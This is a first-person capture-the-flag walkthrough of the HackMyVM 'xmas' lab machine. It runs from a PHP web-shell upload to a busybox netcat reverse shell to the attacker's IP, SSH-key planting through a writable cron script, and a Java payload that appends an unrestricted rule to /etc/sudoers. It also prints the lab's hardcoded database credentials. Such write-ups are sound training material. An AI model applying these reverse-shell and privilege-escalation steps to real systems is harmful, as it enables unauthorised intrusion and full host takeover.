# xmas

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| xmas | eMVee | Beginner | HackMyVM |

**Summary:** The compromise started with basic service discovery that exposed an Apache web application and an upload workflow intended for PDF documents. The upload validation was weak, so a PHP payload was accepted and placed in a web reachable path, which gave direct command execution as `www-data`. From this foothold, host enumeration revealed an automation script in `/opt/NiceOrNaughty/nice_or_naughty.py` that connected to MySQL with hardcoded privileged credentials and processed files from the same upload directory. Process monitoring confirmed that this script was executed by cron as user `alabaster`, which created a clean privilege boundary crossing opportunity by replacing the script content with a key deployment payload. Once SSH access as `alabaster` was obtained, privilege escalation to root followed through sudo policy abuse: a Java archive was executable with `NOPASSWD`, and modifying its source allowed appending a permissive rule into `/etc/sudoers`, which granted unrestricted sudo and immediate root shell access for final flag capture.

***

## Reconnaissance

1. I identified the target host in the local segment.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.175 08:00:27:B1:AE:10 VirtualBox
```

2. I set target variables and ran a full TCP scan with default scripts and service detection.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/xmas]
└─$ ip=192.168.100.175 && url=http://$ip
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/xmas]
└─$ nmap -sC -sV -p- $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-02 17:59 WIB
Nmap scan report for 192.168.100.175
Host is up (0.0032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a6:3e:0b:65:85:2c:0c:5e:47:14:a9:dd:aa:d4:8c:60 (ECDSA)
|_  256 99:72:b5:6e:1a:9e:70:b3:24:e0:59:98:a4:f9:d1:25 (ED25519)
80/tcp open  http    Apache httpd 2.4.55
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-title: Did not follow redirect to http://christmas.hmv
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.28 seconds
```

3. I resolved the virtual host and validated the web interface.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/xmas]
└─$ echo '192.168.100.175 christmas.hmv'| sudo tee -a /etc/hosts   [sudo] password for ouba:
192.168.100.175 christmas.hmv
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/xmas]
└─$ url=http://christmas.hmv
```

![](image.png)

4. I enumerated paths and found upload reachable endpoints.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/xmas]
└─$ dirsearch -u $url -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544

Output File: /tmp/xmas/reports/http_christmas.hmv/_26-05-02_18-05-01.txt

Target: http://christmas.hmv/

[18:05:01] Starting:
[18:05:02] 301 -  316B  - /uploads  ->  http://christmas.hmv/uploads/
[18:05:02] 301 -  312B  - /php  ->  http://christmas.hmv/php/
[18:05:03] 301 -  312B  - /css  ->  http://christmas.hmv/css/
[18:05:03] 301 -  315B  - /images  ->  http://christmas.hmv/images/
[18:05:04] 301 -  311B  - /js  ->  http://christmas.hmv/js/
[18:05:05] 301 -  319B  - /javascript  ->  http://christmas.hmv/javascript/
[18:05:11] 301 -  314B  - /fonts  ->  http://christmas.hmv/fonts/
```

***

## Initial Access

1. The upload form claimed to accept PDF only, but it accepted a PHP payload and stored it in `/uploads`. The screenshot below captures the payload creation and upload context.

![](image-1.png)

2. I verified remote command execution through the uploaded web shell.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/xmas]
└─$ curl -s "http://christmas.hmv/uploads/shell.php?cmd=id"
Shelluid=33(www-data) gid=33(www-data) groups=33(www-data)
```

3. I triggered a reverse shell and upgraded it to an interactive TTY.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/xmas]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/xmas]
└─$ curl -s "http://christmas.hmv/uploads/shell.php?cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash"
```

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 57468
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@xmas:/var/www/christmas.hmv/uploads$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/xmas]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@xmas:/var/www/christmas.hmv/uploads$ export SHELL=/bin/bash
www-data@xmas:/var/www/christmas.hmv/uploads$ export TERM=xterm
www-data@xmas:/var/www/christmas.hmv/uploads$ stty rows 90 cols 123
```

4. I enumerated local users and home directories to identify privilege pivot candidates.

```bash
www-data@xmas:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
alabaster:x:1000:1000:Alabaster Snowball:/home/alabaster:/bin/bash
santa:x:1001:1001:Santa Claus,,,:/home/santa:/bin/bash
sugurplum:x:1002:1002:Sugurplum Mary,,,:/home/sugurplum:/bin/bash
bushy:x:1003:1003:Bushy Evergreen,,,:/home/bushy:/bin/bash
pepper:x:1004:1004:Pepper Minstix,,,:/home/pepper:/bin/bash
shinny:x:1005:1005:Shinny Upatree,,,:/home/shinny:/bin/bash
wunorse:x:1006:1006:Wunorse Openslae,,,:/home/wunorse:/bin/bash
```

```bash
www-data@xmas:/$ ls -la /home
total 36
drwxr-xr-x  9 root      root      4096 Nov 19  2023 .
drwxr-xr-x 20 root      root      4096 Nov 17  2023 ..
drwxr-x---  7 alabaster alabaster 4096 Nov 20  2023 alabaster
drwxr-x---  2 bushy     bushy     4096 Nov 19  2023 bushy
drwxr-x---  2 pepper    pepper    4096 Nov 19  2023 pepper
drwxr-x---  2 santa     santa     4096 Nov 20  2023 santa
drwxr-x---  2 shinny    shinny    4096 Nov 19  2023 shinny
drwxr-x---  2 sugurplum sugurplum 4096 Nov 19  2023 sugurplum
drwxr-x---  2 wunorse   wunorse   4096 Nov 19  2023 wunorse
```

5. I inspected the automation script and extracted hardcoded database credentials plus file processing logic.

```bash
www-data@xmas:/$ cat /opt/NiceOrNaughty/nice_or_naughty.py
import mysql.connector
import random
import os

# Check the wish lists directory
directory = "/var/www/christmas.hmv/uploads"
# Connect to the mysql database christmas
mydb = mysql.connector.connect(
    host="localhost",
    user="root",
    password="ChristmasMustGoOn!",
    database="christmas"
)

#Read the names of the wish list
def read_names(directory):
    for filename in os.listdir(directory):
        full_path = os.path.join(directory, filename)
        if os.path.isfile(full_path):
            name, ext = os.path.splitext(filename)
            if any(char.isalnum() for char in name):
                status = random.choice(["nice", "naughty"])
                #print(f"{name} {status}")
                insert_data(name, status)
                os.remove(full_path)
            else:
                pass

        elif os.path.isdir(full_path):
            pass

# Insert name into the database
def insert_data(name, status):
    mycursor = mydb.cursor()
    sql = "INSERT INTO christmas (name, status) VALUES ( %s, %s)"
    val = (name, status)
    mycursor.execute(sql, val)
    mydb.commit()

#Generate printable Nice and Naughty list
def generate_lists():
    mycursor = mydb.cursor()

    # SQL query to fetch all names and status
    mycursor.execute("SELECT name, status FROM christmas")

    # Separate the nice and naughty lists
    nice_list = []
    naughty_list = []

    for (name, status) in mycursor:
        if status == "nice":
            nice_list.append(name)
        else:
            naughty_list.append(name)

    parent_directory = os.path.dirname(os.getcwd())
    file_path = "/home/alabaster/nice_list.txt"
    # Save the nice and naughty lists to separate txt files
    with open(file_path, "w") as file:
        for name in nice_list:
            file.write(f"{name}\n")
    file_path = "/home/alabaster/naughty_list.txt"
    with open(file_path, "w") as file:
        for name in naughty_list:
            file.write(f"{name}\n")

read_names(directory)
generate_lists()
```

***

## Privilege Escalation

1. I transferred `pspy64` and confirmed that cron executed `/opt/NiceOrNaughty/nice_or_naughty.py` as user `alabaster`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
www-data@xmas:/tmp$ wget http://192.168.100.1:8080/pspy64
--2026-05-02 11:41:34--  http://192.168.100.1:8080/pspy64
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                           0%[                                                    ]       0  --pspy64                         100%[===================================================>]   2.96M  --.-KB/s    in 0.1s

2026-05-02 11:41:34 (24.7 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

```bash
172.20.128.1 - - [02/May/2026 18:41:35] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
www-data@xmas:/tmp$ chmod 777 pspy64
```

```bash
www-data@xmas:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
2026/05/02 11:44:01 CMD: UID=1000  PID=1762   | /bin/sh -c /usr/bin/python3 /opt/NiceOrNaughty/nice_or_naughty.py
```

2. I generated an SSH key pair on the attacker side for account takeover through the writable cron script path.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ sudo ssh-keygen -t rsa -f alabaster_key
[sudo] password for ouba:
Generating public/private rsa key pair.
Enter passphrase for "alabaster_key" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in alabaster_key
Your public key has been saved in alabaster_key.pub
The key fingerprint is:
SHA256:DpTuhwYQdJHIg1dB6XRLzI6L3Afxo0f3Hbn1N/w2as0 root@CLIENT-DESKTOP
The key's randomart image is:
+---[RSA 3072]----+
| +o+*B           |
|. =o= =.         |
| ..+ Bo.     .   |
|   .+o* .   o .  |
| . o.=ooS. . +.. |
|  o +oo+  . o  oo|
|     o+ o     o +|
|     . .     . Eo|
|            .....|
+----[SHA256]-----+

┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ sudo chmod 600 alabaster_key.pub
```

3. I replaced the scheduled Python script with a one liner that wrote my public key into `/home/alabaster/.ssh/authorized_keys`.

```bash
www-data@xmas:/tmp$ echo 'import os; os.system("mkdir -p /home/alabaster/.ssh && echo \"ssh-rsa [REDACTED]1gUKt+gOIYI+yvNELTHIH4w2XjkM= root@CLIENT-DESKTOP\" > /home/alabaster/.ssh/authorized_keys && chmod 700 /home/alabaster/.ssh && chmod 600 /home/alabaster/.ssh/authorized_keys")' > /opt/NiceOrNaughty/nice_or_naughty.py
www-data@xmas:/tmp$ cat /opt/NiceOrNaughty/nice_or_naughty.py
import os; os.system("mkdir -p /home/alabaster/.ssh && echo \"ssh-rsa [REDACTED]1gUKt+gOIYI+yvNELTHIH4w2XjkM= root@CLIENT-DESKTOP\" > /home/alabaster/.ssh/authorized_keys && chmod 700 /home/alabaster/.ssh && chmod 600 /home/alabaster/.ssh/authorized_keys")
```

4. After cron execution, I authenticated as `alabaster` and validated account privileges.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ sudo ssh -i alabaster_key alabaster@192.168.100.175
The authenticity of host '192.168.100.175 (192.168.100.175)' can't be established.
ED25519 key fingerprint is: SHA256:Nx8t8PxD4I1feAvunIosXZAEt72GCFTn8mZE1J6D0EU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.175' (ED25519) to the list of known hosts.
 ___________________________________________________________________________
|        ___ ___ _  _ _____ ___     ___ _    ___ _ _ ___           .-""",   |
|       / __/ . \ \| |_   _| . \   /  _/ |  | . \ | | __/         /____, \  |
|       \__ \   |  ` | | | |   |  |  (_  |__|   | | |__ \        {_____}`{} |
|       \___/_|_|_|\_| |_| |_|_|   \___\____|_|_|___/___/       (/ . . \)   |
|                                                               {`-=^=-`}   |
|                                                               {   `   }   |
|                                                               {       }   |
|    _                                                           {     }    |
|   (_)_______                                                    `-,-`     |
|   |/| NORTH |                   aka: "St. Nicholas"                       |
|   |/| POLE  |                        "Kris Kringle"                       |
|   |/|"""""""`                        "Father Christmas"                   |
|   |/|                                "Pere Noel"                          |
|   |/|                                "Kerstman"                           |
|   |/|                                "Weihnachtsmann"                     |
|___________________________________________________________________________|
| Authorized access only!                                                   |
| If you are not authorized to access or use this system, disconnect now!   |
|___________________________________________________________________________|
Welcome to Ubuntu 23.04 (GNU/Linux 6.2.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat May  2 11:58:54 AM UTC 2026

  System load:  0.08               Processes:               111
  Usage of /:   49.5% of 13.67GB   Users logged in:         0
  Memory usage: 41%                IPv4 address for enp0s3: 192.168.100.175
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

2 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov 20 19:25:45 2023 from 10.0.2.15
alabaster@xmas:~$ id
uid=1000(alabaster) gid=1000(alabaster) groups=1000(alabaster),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
alabaster@xmas:~$ ls -la
total 60
drwxr-x--- 7 alabaster alabaster 4096 Nov 20  2023 .
drwxr-xr-x 9 root      root      4096 Nov 19  2023 ..
-rw------- 1 alabaster alabaster  791 Nov 20  2023 .bash_history
-rw-r--r-- 1 alabaster alabaster  220 Jan  7  2023 .bash_logout
-rw-r--r-- 1 alabaster alabaster 3771 Jan  7  2023 .bashrc
drwx------ 3 alabaster alabaster 4096 Nov 19  2023 .cache
drwxrwxr-x 4 alabaster alabaster 4096 Nov 19  2023 .local
-rw-rw-r-- 1 alabaster alabaster   48 May  2 11:54 naughty_list.txt
-rw-rw-r-- 1 alabaster alabaster   19 May  2 11:54 nice_list.txt
drwxrwxr-x 2 alabaster alabaster 4096 Nov 19  2023 NiceOrNaughty
-rw-r--r-- 1 alabaster alabaster  807 Jan  7  2023 .profile
drwxrwxr-x 2 alabaster alabaster 4096 Nov 20  2023 PublishList
-rw-rw-r-- 1 alabaster alabaster   66 Nov 19  2023 .selected_editor
drwx------ 2 alabaster alabaster 4096 Nov 17  2023 .ssh
-rw-r--r-- 1 alabaster alabaster    0 Nov 17  2023 .sudo_as_admin_successful
-rw-rw---- 1 alabaster alabaster  849 Nov 19  2023 user.txt
```

```bash
alabaster@xmas:~$ which sudo
/usr/bin/sudo
alabaster@xmas:~$ sudo -l
Matching Defaults entries for alabaster on xmas:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User alabaster may run the following commands on xmas:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
```

```bash
alabaster@xmas:~$ ls -la PublishList/
total 28
drwxrwxr-x 2 alabaster alabaster 4096 Nov 20  2023 .
drwxr-x--- 7 alabaster alabaster 4096 Nov 20  2023 ..
-rw-rw-r-- 1 alabaster alabaster   38 Nov 20  2023 manifest.mf
-rw-rw-r-- 1 alabaster alabaster   24 Nov 20  2023 MANIFEST.MF
-rw-rw-r-- 1 alabaster alabaster 1760 Nov 20  2023 PublishList.class
-rw-rw-r-- 1 alabaster alabaster 1477 Nov 20  2023 PublishList.jar
-rw-rw-r-- 1 alabaster alabaster 1182 Nov 20  2023 PublishList.java
```

5. I edited `PublishList.java` to append a permissive sudo rule, rebuilt the JAR, executed it via allowed sudo path, and switched to root.

```bash
alabaster@xmas:~$ cd PublishList/
alabaster@xmas:~/PublishList$ vim PublishList.java
alabaster@xmas:~/PublishList$ cat PublishList.java
public class PublishList {
    public static void main(String[] args) {
        try {
            String[] cmd = {"/bin/bash", "-c", "echo 'alabaster ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"};
            Runtime.getRuntime().exec(cmd).waitFor();
            System.out.println("[+] Succeed! run 'sudo -i'");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
alabaster@xmas:~/PublishList$ javac PublishList.java
alabaster@xmas:~/PublishList$ jar cfe PublishList.jar PublishList PublishList.class
alabaster@xmas:~/PublishList$ sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
[+] Succeed! run 'sudo -i'
alabaster@xmas:~/PublishList$ sudo -l
Matching Defaults entries for alabaster on xmas:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User alabaster may run the following commands on xmas:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
    (ALL) NOPASSWD: ALL
```

```bash
alabaster@xmas:~/PublishList$ sudo -i
root@xmas:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
xmas
root@xmas:~# cat /home/alabaster/user.txt ; cat /root/root.txt
    ||::|:||   .--------,
    |:||:|:|   |_______ /        .-.
    ||::|:|| ."`  ___  `".    {\('v')/}
    \\\/\///:  .'`   `'.  ;____`(   )'___________________________
     \====/ './  o   o  \|~     ^" "^                          //
      \\//   |   ())) .  |   Merry Christmas!                   \
       ||     \ `.__.'  /|                                     //
       ||   _{``-.___.-'\|   Flag: HMV{7bM[REDACTED]}          \
       || _." `-.____.-'`|    ___                              //
       ||`        __ \   |___/   \______________________________\
     ."||        (__) \    \|     /
    /   `\/       __   vvvvv'\___/
    |     |      (__)        |
     \___/\                 /
       ||  |     .___.     |
       ||  |       |       |
       ||.-'       |       '-.
       ||          |          )
       ||----------'---------'
      __,_,_,___)          _______
    (--| | |             (--/    ),_)        ,_)
       | | |  _ ,_,_        |     |_ ,_ ' , _|_,_,_, _  ,
     __| | | (/_| | (_|     |     | ||  |/_)_| | | |(_|/_)___,
    (      |___,   ,__|     \____)  |__,           |__,

                            |                         _...._
                         \  _  /                    .::o:::::.
                          (\o/)                    .:::'''':o:.
                      ---  / \  ---                :o:_    _:::
                           >*<                     `:}_>()<_{:'
                          >0<@<                 @    `'//\\'`    @
                         >>>@<<*              @ #     //  \\     # @
                        >@>*<0<<<           __#_#____/'____'\____#_#__
                       >*>>@<<<@<<         [__________________________]
                      >@>>0<<<*<<@<         |=_- .-/\ /\ /\ /\--. =_-|
                     >*>>0<<@<<<@<<<        |-_= | \ \\ \\ \\ \ |-_=-|
                    >@>>*<<@<>*<<0<*<       |_=-=| / // // // / |_=-_|
      \*/          >0>>*<<@<>0><<*<@<<      |=_- |`-'`-'`-'`-'  |=_=-|
  ___\\U//___     >*>>@><0<<*>>@><*<0<<     | =_-| o          o |_==_|
  |\\ | | \\|    >@>>0<*<<0>>@<<0<<<*<@<    |=_- | !     (    ! |=-_=|
  | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<  _|-,-=| !    ).    ! |-_-=|_
  |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<@</=-((=_| ! __(:')__ ! |=_==_\
  |\\_|_|&&_// ||*.*.*.*|_\\db//__     (\_/)-=))-|/^\=^=^^=^=/^\| _=-_-_\
  """"|'.'.'.|~~|.*.*.*|     ____|_   =('.')=//   ,------------.
      |'.'.'.|   ^^^^^^|____|>>>>>>|  ( ~~~ )/   (((((((())))))))
      ~~~~~~~~         '""""`------'  `w---w`     `------------'
      Flag HMV{GUb[REDACTED]}
```

***

## Attack Chain Summary
1. **Reconnaissance**: Port scanning identified SSH and Apache, then virtual host mapping exposed `christmas.hmv` and web entry points including `/uploads`.
2. **Vulnerability Discovery**: The file upload control accepted executable PHP content despite intended document restrictions.
3. **Exploitation**: The uploaded shell delivered command execution and then an interactive reverse shell as `www-data`.
4. **Internal Enumeration**: Local script analysis and process monitoring showed that a cron job executed a writable Python file as user `alabaster`, enabling SSH key planting.
5. **Privilege Escalation**: After SSH access as `alabaster`, a sudo permitted Java archive was modified to append unrestricted sudo rights, yielding a root shell and both flags.
